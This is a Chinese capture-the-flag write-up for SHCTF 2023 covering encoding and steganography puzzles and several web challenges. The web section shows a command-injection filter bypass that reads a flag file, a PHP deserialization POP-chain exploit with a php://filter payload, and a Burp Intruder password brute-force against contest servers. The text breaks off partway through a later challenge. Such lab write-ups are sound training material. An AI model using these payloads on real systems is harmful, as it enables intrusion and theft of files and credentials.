<a name="UC4MR"></a>
# SHCTF(山河）赛事部分Write up-白猫
<a name="t3jlG"></a>
## MISC
<a name="TmkCm"></a>
### [WEEK1]签到题
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698027084510-496e8ffb-2df5-4bb4-8fd8-a2ed83e879dc.png#averageHue=%23fcfcfb&clientId=u4bdbfc3e-539a-4&from=paste&height=666&id=ub3252daa&originHeight=833&originWidth=919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17972&status=done&style=none&taskId=u50391651-67fc-425f-ae60-dc0b8fda42b&title=&width=735.2)<br />base128编码：<br />`Wm14aFozdDBhR2x6WDJselgyWnNZV2Q5`<br />**因为是base128编码，所以通过两次base64解码，即可得出flag**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698028783897-c2412e63-f02b-47dd-a4c8-d188e7b67aab.png#averageHue=%231b1e27&clientId=u4bdbfc3e-539a-4&from=paste&height=394&id=ue9914940&originHeight=492&originWidth=667&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132997&status=done&style=none&taskId=u15794f09-55fc-4b57-8525-00c9cb6d020&title=&width=533.6)<br />**爆出flag：**<br />`flag{this_is_flag}`<br />**总结：	**
> 这道签到题主要考察了对base64编码的基础了解

<a name="R90QP"></a>
### [WEEK1]Steganography
下载题目并打开：![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698040810161-16e9b713-84b7-4a23-a1a5-bea4ffc84abc.png#averageHue=%23f9f7f6&clientId=ufc37656c-05ed-4&from=paste&height=82&id=uc10cc76e&originHeight=102&originWidth=753&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13367&status=done&style=none&taskId=ucc0e63c5-2aed-4209-ade9-ac1c2a2546e&title=&width=602.4)有三个文件，两个图片文件和一个压缩包文件<br />看到了flag压缩包，打开看一下![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698040892741-dc986b38-7414-4203-86a5-d43f64baa15f.png#averageHue=%23f2f2f2&clientId=ufc37656c-05ed-4&from=paste&height=407&id=u44214690&originHeight=509&originWidth=758&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=19471&status=done&style=none&taskId=uaf49dfa7-7be7-4b27-bd18-f47c5adfb08&title=&width=606.4)**发现有flag文本文件存在，但是需要密码**<br />那么密码信息可能在上面那两个图片文件中，直接放入到010浅浅分析一波<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698041220364-777aef74-a67c-4fa0-a856-1540ce1802b8.png#averageHue=%234c90ce&clientId=ufc37656c-05ed-4&from=paste&height=74&id=u999e30f3&originHeight=92&originWidth=193&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24939&status=done&style=none&taskId=u93eebc9e-c1e3-48b7-b09e-657b03defbd&title=&width=154.4)<br />两个图片竟然一模一样，有点意思<br />在careful.jpg图片16进制字符串中发现了base64编码格式（==或=就是base64编码的重要特征）<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698108431875-95e5ebbf-7398-4b40-bb8f-ee824c8880ea.png#averageHue=%235c231e&clientId=u90925720-b530-4&from=paste&height=327&id=u6bb5d0c4&originHeight=409&originWidth=768&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76727&status=done&style=none&taskId=u3e567bda-c500-4500-a674-d749801fde5&title=&width=614.4)<br />`MTJlcmNzLi4uLi45MDlqaw==`<br />放到Kali里面浅浅解码一波<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698108868841-0b409760-6cc0-46f3-9bc7-84135f8062cd.png#averageHue=%231b1e28&clientId=u90925720-b530-4&from=paste&height=403&id=u575254a8&originHeight=504&originWidth=683&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133495&status=done&style=none&taskId=u2a948672-4883-472f-8667-38f478cadd2&title=&width=546.4)<br />得到如下字符串<br />`12ercs.....909jk`<br />想到flag.txt需要用密码打开，猜测这个就是密码，但是呢，还有一个图片没有用上，所以这5个点显然不是密码。<br />把careful1.jpg放入到010分析一波![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698109083876-8a8d09d2-0ab8-434e-b81d-2d5ce2ccc501.png#averageHue=%23a5bcad&clientId=u90925720-b530-4&from=paste&height=322&id=udd405f57&originHeight=402&originWidth=809&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74060&status=done&style=none&taskId=uc80c5a86-6079-4995-b8ca-c2265286af7&title=&width=647.2)<br />在16进制字符串中并没有发现什么有用的东西，只是一堆乱码，那么下一步该如何进行呢？<br />尝试查看一下careful1.jpg的图片属性，看看是否能有所突破<br />查看图片属性<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698109301104-7f92f0b5-3b3f-43d1-80c4-c5fcd9815493.png#averageHue=%23f8f8f7&clientId=u90925720-b530-4&from=paste&height=607&id=uba055d1e&originHeight=759&originWidth=539&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43681&status=done&style=none&taskId=u4224b8dd-7fec-4962-8627-8fe7e9c0867&title=&width=431.2)<br />出题人还是非常善良的，可以看到出题人在图片备注中给我们留了信息，刚好是5个字符对应了5个点
> `xqwed`
> `12ercs.....909jk`

**密码：**<br />`12ercsxqwed909jk`<br />打开flag.txt<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698109575684-b5f2a2b4-cb7e-4ddc-8239-a1235aa33225.png#averageHue=%23fbfbfa&clientId=u90925720-b530-4&from=paste&height=545&id=u09b2cba8&originHeight=681&originWidth=1648&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=189581&status=done&style=none&taskId=u081c22eb-94b3-4a75-9a93-7e26eb6bbb6&title=&width=1318.4)<br />**爆出flag：**<br />`**flag{4d72e4f3-4d4f-4969-bc8c-a2f6f7a4292c}**`
<a name="iRqkJ"></a>
### [WEEK1]可爱的派蒙捏
下载题目文件，是一个压缩包，里面只有一张图片<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698128783467-292f295c-d31d-4512-9e62-c8de83e5cfa7.png#averageHue=%23f3f2f1&clientId=u90925720-b530-4&from=paste&height=594&id=u02acfcd7&originHeight=742&originWidth=1010&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=140304&status=done&style=none&taskId=uf536c200-7e94-4a17-8079-91ff4c254dd&title=&width=808)<br />放到010里面分析一波<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698129515052-652cf971-0d09-4bcb-9f53-ef1814e170be.png#averageHue=%235c5956&clientId=u90925720-b530-4&from=paste&height=390&id=u410e9663&originHeight=488&originWidth=755&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95570&status=done&style=none&taskId=uafa8eba1-7127-4351-aa7e-49e0c94817c&title=&width=604)<br />图片隐写，发现存在两个文件txt1.txt和txt2.txt<br />放到Kali binwalk把这两个文本文件提取出来<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698129973800-89c7d2ae-4128-4699-b9c3-3a61a942ac4f.png#averageHue=%231e2237&clientId=u90925720-b530-4&from=paste&height=510&id=ue0399db0&originHeight=637&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=467109&status=done&style=none&taskId=uc1c19d2f-a1a9-4f4c-9c43-40332abc0b1&title=&width=881.6)<br />提取成功，看看这两个文件里面是什么内容<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698130110286-9389c505-83fb-4c20-8c7b-99e0fdfe86f1.png#averageHue=%236e7174&clientId=u90925720-b530-4&from=paste&height=618&id=u3705ebc9&originHeight=772&originWidth=1280&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=238177&status=done&style=none&taskId=uc8527929-d562-48f4-a067-4d40a27388a&title=&width=1024)![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698130175563-6b60bd84-abdc-44ad-b34e-9644c3e3b784.png#averageHue=%236e7173&clientId=u90925720-b530-4&from=paste&height=621&id=ud3380638&originHeight=776&originWidth=1280&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=240762&status=done&style=none&taskId=u4ab4b879-655a-421d-bd8a-d8944211273&title=&width=1024)<br />刚开始我以为这是什么编码，看来是我想复杂了，经过这两个文件频繁切换，看到了有个别字符不同，大部分字符是相同的，想到了将不同字符提取出来，就是flag<br />拖入到物理机<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698131576002-2a9dc976-346b-4ae3-ad97-76ffe4e7684a.png#averageHue=%233f7fb5&clientId=u90925720-b530-4&from=paste&height=125&id=ufb312961&originHeight=156&originWidth=381&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=63669&status=done&style=none&taskId=ufca0d1d3-abeb-4023-8b88-8d3f4284ffd&title=&width=304.8)<br />复制到pycharm项目中<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698131649168-04296497-ac89-49b6-aaab-4c1a144dfd2e.png#averageHue=%231e1f19&clientId=u90925720-b530-4&from=paste&height=50&id=u22d164a0&originHeight=63&originWidth=364&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2200&status=done&style=none&taskId=u3994d36e-fffd-4679-8a59-9495cdf93e4&title=&width=291.2)<br />**编写python脚本**
```python
# 打开第一个文本文件并读取内容
with open('txt1.txt', 'r', encoding='utf-8') as file1:
    text1 = file1.read()
# 打开第二个文本文件并读取内容
with open('txt2.txt', 'r', encoding='utf-8') as file2:
    text2 = file2.read()
# 找出text2中与text1不同的字符
differences = []
for i, (char1, char2) in enumerate(zip(text1, text2)):
    if char1 != char2:
        differences.append(char2)
# 打印text2中与text1不同的字符
print("text2中与text1不同的字符:", ''.join(differences))
```
在代码中我做了注释，方便大家理解<br />运行python脚本<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698131892032-f3c91620-010b-4646-9c03-417c3c81c30e.png#averageHue=%23282922&clientId=u90925720-b530-4&from=paste&height=864&id=u2c36f630&originHeight=1080&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=142495&status=done&style=none&taskId=uea6bcdad-f151-4c08-84be-f846d5945f1&title=&width=1535.2)<br />**爆出flag：**<br />`**flag{4ebf327905288fca947a}**`
<a name="Ao2ao"></a>
### **[WEEK1]message**
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698563387974-7b72a5d6-7944-48a2-860a-faf84573c8cd.png#averageHue=%23fcfbfb&clientId=u5f6bd32b-c47c-4&from=paste&height=659&id=u4b459052&originHeight=824&originWidth=921&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32940&status=done&style=none&taskId=u7945668e-7130-46ce-b4e7-24bb8efa0e4&title=&width=736.8)
> 0001000D91683106019196F40008C26211002072B975915730671B54114F60000A000A592982B15C065265843D8A938A00000A000A5E8A9AA453D883525730000A000A91527CBE518D6E1751656CEA75D5000A000A6C899ED852305BF94E0D8D77000A000A8FD94E0053CC624B535191195230002062B14F4F4F6000530048004300540046007B00620061003900370038003400300035002D0062003100630038002D0038003400370063002D0038006500360039002D006600360032003100370037006500340063003000380037007D

有ABCDEF猜测是16进制编码，16进制转字符串一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698563572363-34b793dc-93a5-4168-a081-998f1ac97e59.png#averageHue=%23f9f7f5&clientId=u5f6bd32b-c47c-4&from=paste&height=310&id=ub50fd4da&originHeight=387&originWidth=1287&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79930&status=done&style=none&taskId=u405740c7-2875-4d17-9362-4901d1d6a84&title=&width=1029.6)<br />**得出flag：**<br />`SHCTF{ba978405-b1c8-847c-8e69-f62177e4c087}`
<a name="FGYCp"></a>
### [WEEK1] 真的签到
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698563774334-f396ac83-4ea0-44ea-b7be-36fd9fd1e1e8.png#averageHue=%23e7eae7&clientId=u5f6bd32b-c47c-4&from=paste&height=469&id=u1e2dda2b&originHeight=586&originWidth=693&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100737&status=done&style=none&taskId=u24843dab-a779-45b8-82c4-dfef7c7baa5&title=&width=554.4)<br />不再多说，跟着操作走即可<br />**得出flag：**<br />`flag{Welc0me_tO_SHCTF2023}`
<a name="OGkOT"></a>
### [WEEK2]远在天边近在眼前
下载题目并打开：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698564089297-2c561edb-3a87-46cc-88ab-06d6b0673393.png#averageHue=%23fcfcfb&clientId=u5f6bd32b-c47c-4&from=paste&height=862&id=u01a65339&originHeight=1078&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145199&status=done&style=none&taskId=u2820b99a-bead-42c2-a5d5-976c1f4b1d1&title=&width=1536)<br />很明显flag就是所有文件的路径地址<br />考虑到路径地址复制下来有的符号会丢失，放入010打开<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698564265235-b6d97338-c3e9-4aca-94b0-afaafdc3b3bd.png#averageHue=%23b2c5b3&clientId=u5f6bd32b-c47c-4&from=paste&height=386&id=u1b9fcb4e&originHeight=482&originWidth=995&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=70585&status=done&style=none&taskId=uf32dd44b-9351-44ad-a092-f21a8895207&title=&width=796)<br />`}/8/2/1/5/a/3/8/4/8/2/5/0/_/?/T/H/G/l/r/I/4/_/Y/s/A/3/_/y/l/L/A/e/r/_/s/i/_/S/i/H/t/{/g/a/l/f`<br />反的flag，还这么长，不想手动排序了，写个python脚本梭一把<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698564994126-2678b2a4-d02d-4d17-8c7e-bd6f17394edc.png#averageHue=%23282922&clientId=u5f6bd32b-c47c-4&from=paste&height=864&id=uf09cb3d1&originHeight=1080&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120947&status=done&style=none&taskId=ueb386964-f36a-4092-9291-3fa7b961498&title=&width=1535.2)
```python
ctf='}/8/2/1/5/a/3/8/4/8/2/5/0/_/?/T/H/G/l/r/I/4/_/Y/s/A/3/_/y/l/L/A/e/r/_/s/i/_/S/i/H/t/{/g/a/l/f'
flag=ctf[::-1]
flag=flag.replace('/','')#删除字符'/'
print(flag)
```
**得出flag：**<br />`flag{tHiS_is_reALly_3AsY_4IrlGHT?_0528483a5128}`
<a name="u0sr4"></a>
### [FINAL]问卷
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565335462-6e24cf7c-319c-4566-98d1-585a85a94d4e.png#averageHue=%23f6f7f2&clientId=u35de8186-3912-4&from=paste&height=579&id=u7d26579e&originHeight=724&originWidth=692&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=99360&status=done&style=none&taskId=u3e3ff773-8ec3-4864-8dc2-b44211d9b14&title=&width=553.6)<br />跟着操作走即可<br />![4a0c01102689499eea8e80442d2510d.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565442084-df135f65-9aba-4383-ad00-0af77e242bae.png#averageHue=%23f9f9f9&clientId=u35de8186-3912-4&from=paste&height=991&id=ua32118b8&originHeight=1239&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117110&status=done&style=none&taskId=uc88b96a7-b971-4a79-8bcd-da91738ba64&title=&width=864)<br />**得出flag：**<br />`flag{SHCTF_Round2_will_do_even_better!}`
<a name="q8DKW"></a>
## Web
<a name="G2Xi7"></a>
### [WEEK1]babyRCE
刚开始不要把题想的那么难，看下环境代码
```php
<?php
$rce = $_GET['rce'];
if (isset($rce)) {
	if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\<|\'|\"/i", $rce)) {
		system($rce);
		}	
else {
		echo "hhhhhhacker!!!"."\n";
		}
} else {
	highlight_file(__FILE__);
}
```
**一、PHP代码审计**

1. 可以明显看到给了一个GET方式传参，这个参数是rce
2. if判断语句**,isset函数**用来判断rce这个参数是否存在并且是否不为空，如果条件达成，则true
3. **preg_match正则表达式**，用来过滤一些命令，可以看到过滤了cat、more、less、head、tac、tail、nl、od、vi、vim、sort、flag等命令并且过滤了整数和空格以及一些常用符号
4. **system外部执行命令**，将参数rce的值作为命令执行，从这里可以看出这道题降低了难度，因为我们不再需要外部执行命令了，所以直接给参数rce传值即可
5. else与if语句联用，反之则输出对应的字符串
6. 同5，highlight_file(__FILE__)函数用来高亮显示文件内容，就是把文件内容或者代码高亮显示到网页当中

**二、解题思路**

1. 查看目录文件，幸运的是发现ls和/没有被过滤
2. 绕正则，看它有没有漏掉的过滤命令，发现没有过滤uniq命令，uniq命令可以查看文件内容
3. 绕正则，查看文件命令需要用到空格，结果发现空格被过滤，可以使用${IFS}代替空格
4. 绕正则，flag被过滤，可以通过f???进行绕过，可以理解为列出包含f的四个字符文件

**三、开始解题**

1. **使用ls命令查看目录文件**

`?rce=ls`<br />回显结果<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565608696-688f7d62-42b3-416b-9a0d-081b1f4b630b.png#averageHue=%23f7f5f3&clientId=u35de8186-3912-4&from=paste&height=119&id=u1a2d95d2&originHeight=149&originWidth=592&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21494&status=done&style=none&taskId=u9a70e969-6ca2-4a3c-becc-e0cd002c773&title=&width=473.6)<br />`flag.php index.php`

2. **发现有flag.php文件的存在，尝试使用构造payload**

`?rce=uniq${IFS}f???.php`<br />回显结果<br />空白内容，F12试试<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565653633-a977a672-10c8-4a5f-825f-865f712661e1.png#averageHue=%23f7f6f6&clientId=u35de8186-3912-4&from=paste&height=176&id=u90e8c8c9&originHeight=220&originWidth=815&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30460&status=done&style=none&taskId=u2f025427-899e-43e2-aa3d-452db30653c&title=&width=652)
```php
<?php
$flag = getenv('GZCTF_FLAG');
if($flag=="not_flag" or $flag==""){
$flag="dzctf{test_flag}";
}
```
getenv函数用来获取环境变量,flag的值等于这个环境变量的值<br />如果说flag是空的，则flag是dzctf{test_flag}，显然这是不可能的<br />就是说这个目录下没有flag<br />那咱们去根目录下试试？

3. **继续构造payload**

`?rce=uniq${IFS}/f???.php`<br />发现网页内容为空，F12内容也是空<br />除了根目录下还有那里有？，猜测flag不是PHP文件，而是文本文件

4. **继续构造payload**

`?rce=uniq${IFS}/f???`<br />回显flag<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565697092-0e345702-ed41-4937-9d58-f079435ce576.png#averageHue=%23f6f4f3&clientId=u35de8186-3912-4&from=paste&height=132&id=u34f14bdc&originHeight=165&originWidth=734&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27443&status=done&style=none&taskId=u9ac39def-6c06-4646-8086-9b851f49788&title=&width=587.2)<br />**得出flag：**<br />`flag{e85932a6-12df-4991-981c-adaf56337196}`
<a name="l8SAO"></a>
### [WEEK1]ez_serialize
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698565985639-f5743f0d-99e5-4fbb-9ceb-322dbffacedc.png#averageHue=%23fdfdfc&clientId=u35de8186-3912-4&from=paste&height=710&id=u361c5e5b&originHeight=887&originWidth=671&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33999&status=done&style=none&taskId=u6ca77dbe-5605-4b25-a40b-ce2ff6f26bb&title=&width=536.8)
```php
<?php
  highlight_file(__FILE__);

class A{
  public $var_1;

  public function __invoke(){
    include($this->var_1);
  }
}

class B{
  public $q;
  public function __wakeup()
  {
    if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->q)) {
      echo "hacker";           
    }
  }

}
class C{
  public $var;
  public $z;
  public function __toString(){
    return $this->z->var;
  }
}

class D{
  public $p;
  public function __get($key){
    $function = $this->p;
    return $function();
  }  
}

if(isset($_GET['payload']))
{
  unserialize($_GET['payload']);
}
  ?>
```
**exp:**
```php
<?php
  class A{
  public $var_1='php://filter/read=convert.base64-encode/resource=flag.php';
  }
  class B{
    public $q;
  }
class C{
  public $var;
  public $z;
}
class D{
  public $p;
}
$A=new A();
$B=new B();
$C=new C();
$D=new D();
$D->p=$A;
$C->var=$B;
$B->q=$C;
$C->z=$D;
echo serialize($C);
```
运行结果：<br />`O:1:"C":2:{s:3:"var";O:1:"B":1:{s:1:"q";r:1;}s:1:"z";O:1:"D":1:{s:1:"p";O:1:"A":1:{s:5:"var_1";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}`<br />**上传exp:**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698566249382-cb98536b-d979-4392-9f8e-14fc07892b23.png#averageHue=%23fcfbfb&clientId=u35de8186-3912-4&from=paste&height=735&id=u0aacfc3c&originHeight=919&originWidth=1170&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75178&status=done&style=none&taskId=u3559ab3d-80f3-49fa-b962-9bfa5e2d3a9&title=&width=936)<br />`PD9waHANCiRmbGFnID0gImZsYWd7NDQxZTY5NzEtMjU3NC00ZWYzLTg5YWYtYWQwNDYwMzA2NmUwfSI7DQo=`<br />base64解码：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698566528691-d632f74b-0f72-4284-8d8b-5c9c2a867f76.png#averageHue=%231a1d2a&clientId=u35de8186-3912-4&from=paste&height=599&id=u8b842781&originHeight=749&originWidth=1118&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=333676&status=done&style=none&taskId=ub92a50fc-9d53-4aac-b851-8ad31d9339f&title=&width=894.4)<br />**得出flag：**<br />`flag{441e6971-2574-4ef3-89af-ad04603066e0}`
<a name="fvbRy"></a>
### [WEEK1]登录就给flag
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698567819799-9b9fdd3b-dd10-488f-8109-61dc44941cc5.png#averageHue=%23f9f8f8&clientId=u35de8186-3912-4&from=paste&height=270&id=ufd2989d2&originHeight=338&originWidth=760&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=27423&status=done&style=none&taskId=uc2d92102-21a8-4132-9f9b-bf2ed1e50a4&title=&width=608)<br />burpsuite抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568013388-7745a06a-4492-4fdc-ab5c-0e8d4aeaaa11.png#averageHue=%23f8f7f7&clientId=u35de8186-3912-4&from=paste&height=534&id=u5fd32629&originHeight=668&originWidth=1275&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=103243&status=done&style=none&taskId=ub18d7650-433e-4933-92e7-f300ec2ad14&title=&width=1020)
> 初始账号：admin
> 初始密码：1

HTTP history<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568119682-46ba2d7f-a805-4219-a16d-135543f21a49.png#averageHue=%23f5f5f5&clientId=u35de8186-3912-4&from=paste&height=554&id=u2c1259d0&originHeight=692&originWidth=1304&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=192967&status=done&style=none&taskId=u65e47fd9-8691-4620-9c51-c748e06f1b8&title=&width=1043.2)<br />Send to Intruder<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568245988-cdfcd75e-f69c-4d94-9f0a-8bf9ef0c4b3f.png#averageHue=%23f9f9f9&clientId=u35de8186-3912-4&from=paste&height=714&id=u67f2fd55&originHeight=892&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110441&status=done&style=none&taskId=u586106e8-228b-4930-a5de-8ea31981933&title=&width=1328.8)<br />Clear<br />选中密码1，Add<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568373823-e5f0e3f9-7ebf-44fe-9aa6-c67e4bee7a10.png#averageHue=%23f9f9f9&clientId=u35de8186-3912-4&from=paste&height=722&id=ue1e664ed&originHeight=902&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112144&status=done&style=none&taskId=uf4132d15-c4e4-45f1-90f9-51d42045251&title=&width=1328.8)<br />Payloads<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568456446-5b2b180a-b1f7-4b9d-a74f-033169479a8f.png#averageHue=%23f7f7f7&clientId=u35de8186-3912-4&from=paste&height=730&id=u9cba7621&originHeight=912&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93712&status=done&style=none&taskId=u6fd0817d-e14c-4bff-8352-88a831c1d1a&title=&width=1328.8)<br />Load添加字典<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568513039-7900aad9-9f90-4e3c-b46b-36a80a411cda.png#averageHue=%23f7f6f6&clientId=u35de8186-3912-4&from=paste&height=722&id=u96c939d4&originHeight=903&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111968&status=done&style=none&taskId=uf37d110e-b22d-4dfd-8285-b7b5d7a6b19&title=&width=1328.8)<br />打开字典<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568562274-09bf342e-04cb-4712-9ddb-b230d95e9c29.png#averageHue=%23f7f6f6&clientId=u35de8186-3912-4&from=paste&height=722&id=u6ea60a2e&originHeight=903&originWidth=1661&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111968&status=done&style=none&taskId=u9d120bfe-4426-46a4-a442-fcab1fde21a&title=&width=1328.8)<br />Start attack开始爆破<br />![e090c218fbdc79eaada97ffb64be64d.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568632920-8c5c0b50-433d-4b7b-826c-f5e8c1c8f651.png#averageHue=%23f8f8f8&clientId=u35de8186-3912-4&from=paste&height=474&id=ub3fd17d2&originHeight=592&originWidth=811&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57302&status=done&style=none&taskId=u0185fa05-a342-4e06-a632-02969d14868&title=&width=648.8)<br />得到密码<br />`password`
> 账户：admin
> 密码：password

登录：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568726410-85bbaa1d-9585-4f16-ad67-5a73e56fef7f.png#averageHue=%23f8f7f6&clientId=u35de8186-3912-4&from=paste&height=260&id=ua89a8cb6&originHeight=325&originWidth=740&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34578&status=done&style=none&taskId=u22b562b9-3c5f-45bf-b1f0-45b88e6083b&title=&width=592)<br />login登录：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698568766252-ff0cd148-3457-48a4-bd01-3991104ae9fa.png#averageHue=%23f8f6f5&clientId=u35de8186-3912-4&from=paste&height=168&id=u3de5bc8c&originHeight=210&originWidth=923&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36233&status=done&style=none&taskId=u23b07673-a0c2-44b1-ae90-7348e1f1198&title=&width=738.4)<br />**得到flag：**<br />`flag{d2974de6-f71e-48f9-9659-dc453a23009a}`
<a name="MLKxC"></a>
### [WEEK1]飞机大战
题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698569212038-2b7151ff-e6e6-4b8a-89d2-d80c935ba892.png#averageHue=%23fefefe&clientId=u35de8186-3912-4&from=paste&height=760&id=u0310dcba&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73932&status=done&style=none&taskId=u5cf00d97-231a-480b-aa7e-eaf3d13ddcc&title=&width=1528.8)<br />**玩了一把，通过才给flag，所以说想玩通过是不可能的，只能另辟蹊径**<br />F12查看网页源代码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698569425553-d68ff2cd-fe95-4bc4-bcc4-28408d95f2f7.png#averageHue=%23fcfbfb&clientId=u35de8186-3912-4&from=paste&height=515&id=ua2ed70d3&originHeight=644&originWidth=864&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38212&status=done&style=none&taskId=u714c114b-729a-4b37-8b48-30c3bbcdd48&title=&width=691.2)
> HTML三大件
> HTML+CSS+JavaScript
> CSS静态网页样式
> JavaScript动态功能

所以说更改游戏分数必须看这个JS文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698569699731-a59e37a2-0e0b-4a82-8f1c-a9f21fbe4993.png#averageHue=%23fbfbfb&clientId=u35de8186-3912-4&from=paste&height=760&id=u2b417c64&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42000&status=done&style=none&taskId=u36c53d0a-a316-476a-b6a5-04b8a295513&title=&width=1528.8)<br />没有看到可控游戏参数，倒是看到了一串\u开头的类似编码的东西<br />有密码学基础的可以看出这是Unicode编码格式<br />`\u005a\u006d\u0078\u0068\u005a\u0033\u0074\u0068\u0059\u0057\u0051\u0033\u005a\u0044\u0041\u0030\u005a\u0043\u0030\u0030\u004e\u0047\u0049\u0030\u004c\u0054\u0051\u0032\u004f\u0054\u0059\u0074\u0059\u006a\u004e\u006c\u004e\u0053\u0030\u007a\u004d\u007a\u0052\u006b\u004e\u006a\u0064\u0068\u004e\u007a\u004d\u0033\u004e\u0047\u004e\u0039\u000a`<br />Unicode解码一把梭<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1698570100050-6bab1955-13e5-4a67-9651-6230d89b8533.png#averageHue=%23fcfcfb&clientId=u35de8186-3912-4&from=paste&height=361&id=u9cf87778&originHeight=451&originWidth=1842&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43229&status=done&style=none&taskId=u438bb009-41f8-4bac-a93f-59d8129d678&title=&width=1473.6)<br />base64<br />`ZmxhZ3thYWQ3ZDA0ZC00NGI0LTQ2OTYtYjNlNS0zMzRkNjdhNzM3NGN9`<br />base64解码一把梭<br 